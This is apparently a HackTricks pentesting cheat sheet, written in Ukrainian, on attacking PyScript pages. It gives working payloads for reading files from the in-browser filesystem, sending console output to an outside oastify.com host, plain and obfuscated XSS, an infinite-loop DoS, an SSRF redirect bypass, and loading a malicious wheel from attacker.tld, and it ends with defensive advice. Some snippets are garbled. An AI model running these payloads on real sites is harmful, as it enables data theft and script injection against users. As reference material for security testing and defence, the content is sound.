# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScript - це новий фреймворк, розроблений для інтеграції Python в HTML, щоб його можна було використовувати разом з HTML. У цьому шпаргалці ви знайдете, як використовувати PyScript для ваших цілей тестування на проникнення.

### Витягування / Отримання файлів з віртуальної файлової системи пам'яті Emscripten:

`CVE ID: CVE-2022-30286`\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Код:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Міжсайтовий скриптинг (Звичайний)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Міжсайтовий скриптинг (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Міжсайтовий скриптинг (Обфускація JavaScript)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS атака (Безкінечний цикл)

Код:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Нові вразливості та техніки (2023-2025)

### Підробка запитів на стороні сервера через неконтрольовані перенаправлення (CVE-2025-50182)

`urllib3 < 2.5.0` ігнорує параметри `redirect` та `retries`, коли він виконується **всередині середовища виконання Pyodide**, яке постачається з PyScript. Коли зловмисник може впливати на цільові URL-адреси, він може змусити Python-код слідувати перенаправленням між доменами, навіть коли розробник явно їх відключив ‑ ефективно обходячи логіку анти-SSRF.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Виправлено в `urllib3 2.5.0` – оновіть пакет у вашому зображенні PyScript або зафіксуйте безпечну версію в `packages = ["urllib3>=2.5.0"]`. Дивіться офіційний запис CVE для деталей.

### Завантаження довільних пакетів та атаки на ланцюг постачання

Оскільки PyScript дозволяє довільні URL-адреси в списку `packages`, зловмисник, який може змінювати або впроваджувати конфігурацію, може виконати **повністю довільний Python** у браузері жертви:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Тільки чисті Python-колеса потрібні – крок компіляції WebAssembly не потрібен.* Переконайтеся, що конфігурація не контролюється користувачем і хостите довірені колеса на власному домені з HTTPS та SRI-хешами.

### Зміни в санітизації виходу (2023+)

* `print()` все ще впроваджує сирий HTML і, отже, піддається XSS (приклади вище).
* Новіший допоміжний засіб `display()` **за замовчуванням екранує HTML** – сирий розмітка повинна бути обгорнута в `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Ця поведінка була введена в 2023 році і задокументована в офіційному посібнику Built-ins. Покладайтеся на `display()` для ненадійного вводу і уникайте прямого виклику `print()`.

---

## Оборонні найкращі практики

* **Тримайте пакети в актуальному стані** – оновлюйте до `urllib3 >= 2.5.0` і регулярно перезбирайте колеса, які постачаються з сайтом.
* **Обмежте джерела пакетів** – посилайтеся лише на назви PyPI або URL-адреси того ж походження, бажано захищені Sub-resource Integrity (SRI).
* **Ускладніть політику безпеки контенту** – забороніть вбудований JavaScript (`script-src 'self' 'sha256-…'`), щоб інжектовані блоки `<script>` не могли виконуватися.
* **Забороніть теги `<py-script>` / `<script type="py">`, надані користувачем** – очищайте HTML на сервері перед його відображенням іншим користувачам.
* **Ізолюйте працівників** – якщо вам не потрібен синхронний доступ до DOM з працівників, увімкніть прапорець `sync_main_only`, щоб уникнути вимог заголовка `SharedArrayBuffer`.

## Посилання

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [Документація PyScript Built-ins – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
